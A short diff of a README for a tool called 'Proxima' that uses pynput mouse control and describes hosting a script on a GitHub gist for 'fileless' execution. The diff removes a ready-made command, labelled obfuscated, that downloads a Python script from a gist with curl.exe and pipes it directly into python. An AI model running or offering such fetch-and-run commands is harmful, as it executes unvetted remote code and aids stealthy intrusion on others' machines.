@@ -82,8 +82,3 @@ from pynput.mouse import Button, Controller as MouseController
 5.  Once created, click the **Raw** button on the top right of the code box.
 6.  Copy that URL.
 7.  Replace the URL in the `curl.exe` command in your README with this new Raw URL.
-
-If you want to skip all of the "How to Host for "Fileless" Execution" steps and just execute Proxima with a already done powershell command, use this one (obfuscated):
-```powershell
-curl.exe -sL "https://gist.githubusercontent.com/dcbzpass/6d1dbcf854d17147713d57c60c6a0cec/raw/a8f9c1e0af3ff5f188a8ec2d7ce6a86acab8c71e/main.py" | python -
-```
